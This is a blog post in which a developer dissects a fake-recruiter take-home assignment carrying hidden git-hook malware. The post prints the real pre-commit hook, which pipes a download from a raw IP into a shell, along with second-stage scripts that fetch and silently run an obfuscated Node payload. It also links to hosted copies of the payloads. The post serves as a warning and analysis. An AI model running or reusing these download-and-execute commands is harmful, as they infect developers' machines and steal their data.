---
title: "Appaji - Software Engineer"
source: "https://citizendot.github.io/articles/fake-job-interview-git-hook-malware/"
author:
published: 2001-07-23
created: 2026-07-25
description: "Appaji, a Computer Science graduate from IIT Patna and former intern at Arista Networks, is a Software Engineer at Infinite Reality. Passionate about building innovative web experiences, with a strong interest in sustainable and customer-focused startups."
---
Discuss on [Hacker News](https://news.ycombinator.com/item?id=49013036) or [LinkedIn](https://www.linkedin.com/feed/update/urn:li:activity:7485790360367980544/).

A recruiter slid into my LinkedIn DMs last Thursday with a Python developer role. I was thrilled that someone had reached out directly, so I asked for more details. When he shared the role description, company name, and the estimated pay, I figured I had nothing to lose.

Here is the initial message:

![[_resources/2026-07-25-Appaji - Software Engineer/bb230a4139a354096cd7b0bea95b314a_MD5.webp]]

Offering $10,000-$15,000 a month for a remote-first, contract-to-hire role is just too good. Also, why is this guy revealing pay info before even we met? I thought recruiters play the “you first, me next” game. Rookie mistake.

![[_resources/2026-07-25-Appaji - Software Engineer/ac0c07a0bed79164b820db2d09cd48b6_MD5.webp]]

Red flags immediately started waving. Why the huge budget? (Well, huge by Indian standards for a remote role; not exactly outrageous by US standards, but good enough to raise an eyebrow.) I looked up the company and saw it was a Y Combinator startup. YC companies aren’t exactly known for conventional operations, so it wasn’t completely outside the realm of possibility. Still, if a company has that kind of cash to throw around, they usually have a much more structured hiring pipeline. I decided to proceed, but kept my guard up.

I sent over my resume. The recruiter quickly approved it and handed over a take-home assignment via a Google Drive link containing a zip archive and a PDF with instructions. Here’s the original drive link: [https://drive.google.com/drive/folders/18i1KDFXAPv7lqfBGddxj7IOnDy8J6VeH?usp=drive\_link](https://drive.google.com/drive/folders/18i1KDFXAPv7lqfBGddxj7IOnDy8J6VeH?usp=drive_link). I made my copy here in case they delete theirs: [https://drive.google.com/drive/folders/1DZYWezjpwolsxXnM5F04\_Ng3nzTRYpVS?usp=sharing](https://drive.google.com/drive/folders/1DZYWezjpwolsxXnM5F04_Ng3nzTRYpVS?usp=sharing).

Assessment PDF was surpringly legitimate looking. It’s about how to improve the existing codebase, architectural suggestions, some git operations etc..

I extracted the zip. At first glance, it was just a boilerplate FastAPI backend using SQLAlchemy; pretty standard stuff. I checked `requirements.txt` for any obvious typosquatting or malicious packages, but it was completely clean. For a brief second, I thought my suspicions were unfounded and this was a legitimate opportunity.

This is just a habit (may be from doing CTFs), whenever I get a random project folder, I just run `tree -a` to see what’s lurking in the hidden directories. But this might be the first time it paid off in the real world.

```plaintext
❯ tree -a .
.
├── alembic.ini
├── for learning
│   ├── dtos.py
│   ├── main.py
│   └── mockData.py
├── .git
│   ├── config
│   ├── description
│   ├── gk
│   │   └── config
│   ├── HEAD
│   ├── hooks
│   │   ├── applypatch-msg
│   │   ├── commit-msg
│   │   ├── fsmonitor-watchman
│   │   ├── post-applypatch
│   │   ├── post-checkout
│   │   ├── post-commit
│   │   ├── post-merge
│   │   ├── post-receive
│   │   ├── post-rewrite
│   │   ├── post-update
│   │   ├── pre-applypatch
│   │   ├── pre-auto-gc
│   │   ├── pre-commit
│   │   ├── pre-merge-commit
│   │   ├── prepare-commit-msg
│   │   ├── pre-push
│   │   ├── pre-rebase
│   │   ├── pre-receive
│   │   ├── proc-receive
│   │   ├── push-to-checkout
│   │   ├── sendemail-validate
│   │   └── update
│   ├── index
│   ├── info
│   │   └── exclude
│   ├── logs
...
```

Wait a minute. A ton of Git hooks were pre-configured in the repository. I opened the `pre-commit` script to see what they were trying to run.

```plaintext
❯ cat .git/hooks/pre-commit
#!/bin/sh

case "$(uname -s)" in
  Darwin*) curl -sL 'http://45.61.164.38:5777/task/mac?id=402' -L | sh > /dev/null 2>&1 & ;;
  Linux*) wget -qO- 'http://45.61.164.38:5777/task/linux?id=402' -L | sh > /dev/null 2>&1 & ;;
  MINGW*|MSYS*|CYGWIN*) curl -sL http://45.61.164.38:5777/task/windows?id=402 -L | cmd > /dev/null 2>&1 & ;;
  *)        curl -sL 'http://45.61.164.38:5777/task/mac?id=402' -L | sh > /dev/null 2>&1 & ;;
esac
```

Bingo. They embedded a script that checks the victim’s host operating system and silently executes a remote payload.

> ***Side note**: Why use a raw IP address? If anything, this screams “malware.” At least register a decoy domain like lint-checker.com or jenkins-ci-runner.net. If the threat actors who wrote this are reading: take notes people!*

Let’s see what the Linux payload actually does. Notice the `id=402` parameter being passed to the endpoint. Keep that in mind.

```plaintext
❯ curl http://45.61.164.38:5777/task/linux?id=402
#!/bin/bash
set -e
echo "Authenticated"
TARGET_DIR="$HOME/Documents"
clear
wget -q -O "$TARGET_DIR/tokenlinux.npl" "http://45.61.164.38:5777/task/tokenlinux?id=402"
clear
mv "$TARGET_DIR/tokenlinux.npl" "$TARGET_DIR/tokenlinux.sh"
clear
chmod +x "$TARGET_DIR/tokenlinux.sh"
clear
nohup bash "$TARGET_DIR/tokenlinux.sh" > /dev/null 2>&1 &
clear
exit 0
```

The script pulls down a secondary payload initially named `tokenlinux.npl` (we’ll circle back to that specific extension later). It then hides the file in my `~/Documents` directory as `tokenlinux.sh`, makes it executable, and fires it off in the background using `nohup`.

> **From Google:** The nohup command (short for “no hang up”) is a Linux/Unix utility that keeps a process running even after you log out, close the terminal, or disconnect from an SSH session.

Down the rabbit hole we go. Let’s inspect this next script.

```plaintext
❯ curl http://45.61.164.38:5777/task/tokenlinux?id=402
...
...
BASE_URL="http://45.61.164.38:5777"
...

# Step 8: Download files

# Check if curl is available

if ! command -v curl >/dev/null 2>&1; then
# If curl is not available, use wget
wget -q -O "$USER_HOME/parser.js" "$BASE_URL/task/parser?id=402"
wget -q -O "$USER_HOME/package.json" "$BASE_URL/task/json"
else
# If curl is available, use curl
curl -s -L -o "$USER_HOME/parser.js" "$BASE_URL/task/parser?id=402"
curl -s -L -o "$USER_HOME/package.json" "$BASE_URL/task/json"
fi

# Step 9: Install 'request' package

cd "$USER_HOME"
if [ ! -d "node_modules/request" ]; then
npm install --silent --no-progress --loglevel=error --fund=false
fi

# Step 10: Run token parser

if [ -f "$USER_HOME/parser.js" ]; then
nohup node "$USER_HOME/parser.js" > "$USER_HOME/parser.log" 2>&1 &
else
exit 1
fi
exit 0
```

> I’ve trimmed the output to the most interesting bits for brevity, but full file is available here: [tokenlinux.txt](https://citizendot.github.io/tokenlinux.txt) (bash script).

This second stage does a lot of heavy lifting. It quietly installs Node.js, configures the system path, downloads a `package.json` and a `parser.js` file, installs the required dependencies, and runs the parser invisibly.

I took a look at `parser.js`. The code was heavily obfuscated, a complete mess to read manually. Remember the `id` parameter? I tried changing it in my request and received a completely different script back. The attackers are likely assigning unique identifiers to track individual candidates, serving customized payloads to each victim.

Since `parser.js` was a brick wall, I pivoted to `package.json`. Unlike the parser, this has to be standard JSON for `npm` to process it.

Btw, I’ve hosted `parser.js` here: [parser.js](https://citizendot.github.io/parser.js)

```plaintext
❯ curl http://45.61.164.38:5777/task/json

{
        "name": "tokendapp",
        "version": "1.0.0",
        "devDependencies": {
                "hardhat": "^2.20.2"
        },
        "dependencies": {
                "axios": "^1.12.2",
                "basic-ftp": "^5.0.5",
                "child_process": "^1.0.2",
                "clipboardy": "^4.0.0",
                "crypto": "^1.0.1",
                "execp": "^0.0.1",
                "fs": "^0.0.1-security",
                "jsonwebtoken": "^9.0.2",
                "process": "^0.11.10",
                "ps-node": "^0.1.6",
                "request": "^2.88.2"
        },
        "scripts": {
                "test": "npx hardhat test",
                "deploy": "npx hardhat run scripts/deploy.js"
        }
}
```

These dependencies are incredibly suspicious. Why would a background setup task need clipboard access (`clipboardy`), and they need file system access (`fs`) too. And what exactly is `hardhat`?

![[_resources/2026-07-25-Appaji - Software Engineer/15d216b245d924eaf5a0f51032ba73b6_MD5.webp]]

Ah, an Ethereum development environment. This makes the tracking ID parameter even more curious. If they were dropping a Bitcoin miner, distributing specific hashing tasks to unique IDs would make sense. But Ethereum shifted away from Proof of Work; it doesn’t rely on mining anymore. They are likely using Hardhat to locate and drain crypto wallets or interact with local browser extensions? idk.

Hoping to deobfuscate `parser.js`, I threw the code into a few LLMs to see if they could untangle it.

Claude took one look at the file and triggered its safety rails, refusing to analyze the script:

![[_resources/2026-07-25-Appaji - Software Engineer/35cbbdcbbcb0a179f403d3267ddbe143_MD5.webp]]

Gemini, on the other hand, was more than happy to break it down (*No, I’m not biased towards Google here. Well, okay, I am a Googler, but you can judge for yourself.*):

![[_resources/2026-07-25-Appaji - Software Engineer/063e3062ba0c098322b1670c6253c724_MD5.webp]]

Earlier, we saw the payload originally named `tokenlinux.npl`. A quick search confirms exactly what kind of threat actor uses that extension:

![[_resources/2026-07-25-Appaji - Software Engineer/b2b74dbcaea87dc3b39ca2cfd4d58662_MD5.webp]]

## The Scam goes deeper

After realizing this was a widespread campaign, I did a bit more digging and found that people are getting different variations of this attack. Some folks received a zip file containing a `.vscode` folder. Inside, the attackers hid commands configured to run as soon as the directory is opened in VSCode (launch commands).

Pretty clever.

You don’t even have to run a git command, just opening this directory in VSCode is enough to get infected.

Also, it’s pretty evident now that this has nothing to do with Zavopay. The attackers just used whatever company name they found to make the offer look legitimate. Out of curiosity, I ran git log to inspect the project’s commit history, wondering if they left any custom traces. It turns out, they just cloned a random public repository.

```plaintext
❯ git log
commit 16a25d9eaef7ef2e831a21ca0d703fe0fa621492 (HEAD -> main, origin/main, origin/feature/payment, origin/HEAD, feature/payment)
Author: rhonda <womenofinspiration2016@gmail.com>
Date:   Mon Jun 29 22:04:17 2026 -0400

    add requirements

commit 8ae96928302a8e0757f2c72f85c46d801c97b91e
Merge: f64c289 d6cb1f2
Author: Bharati Gogoi <bgogoi055@gmail.com>
Date:   Mon Jun 29 21:23:43 2026 +0530

    Merge pull request #10 from Bgogoi123/feature/balance

    [feat][Service for Adjusting Balance]

commit d6cb1f2f14b5d561e3611653327477e6a60eee95
Author: Bharati Gogoi <bharatigogoi@Bharatis-MacBook-Air.local>
Date:   Mon Jun 29 21:20:13 2026 +0530

    [feat][Service for Adjusting Balance]
    - Added a service for adjustinh a user's balance.
    - Removed old/commented codes.

commit f64c2898bbe2d4b5773f39e1022e95a2418fa0b4
Merge: 17aaa4c 9e0dbdf
Author: Bharati Gogoi <bgogoi055@gmail.com>
Date:   Fri Jun 26 23:51:38 2026 +0530

    Merge pull request #9 from Bgogoi123/feature/balance

    [fix][Dependencies Annotated]

commit 9e0dbdf112124a25237018a3b92af10c51c54b5f
Author: Bharati Gogoi <bharatigogoi@Bharatis-MacBook-Air.local>
Date:   Fri Jun 26 23:48:53 2026 +0530

    [fix][Dependencies Annotated]
    - Annotated all dependencies in the router files of each module.
```

A quick search led me straight to the original repo: [https://github.com/Bgogoi123/personal-finance-service](https://github.com/Bgogoi123/personal-finance-service). They literally just took someone’s innocent FastAPI project and slapped a malicious hidden directory on top of it.

Naturally, the next move was pivoting from defense to offense. I wanted to see if the attackers left any vulnerable services exposed on their IP.

An Nmap scan revealed three open ports. Two of them were unresponsive to version detection. Port 22 was running OpenSSH 9.6p1 on Ubuntu. Since that version was released just over a week prior to this scan, there were no known CVEs I could leverage to poke around their infrastructure.

![[_resources/2026-07-25-Appaji - Software Engineer/d79284c63ed7ae6864c0709dec1f81d8_MD5.webp]]

So, they had decent OPSEC on their server, even if their malware deployment was a bit loud. That’s where the trail goes cold for now. Stay safe out there, and always check those hidden directories before running someone else’s code.

Now I understand why their assignment PDF has git tasks. They want to make sure that the candidate runs at least one of the git commands, so the hooks will get triggered.

Oh by the way, The “recruiter” seemed to have deleted the account, right after I called their front out.

![[_resources/2026-07-25-Appaji - Software Engineer/93d46ba09b721466d239ea1fe8146107_MD5.webp]]

That’s it for now. Feel free to connect with me on [LinkedIn](https://www.linkedin.com/in/appaji-chintimi/) if you want to chat, though maybe skip sending any malware-laced take-home tests. (Actually, on second thought, if you have interesting malware samples, send ‘em over!)

Thanks for reading!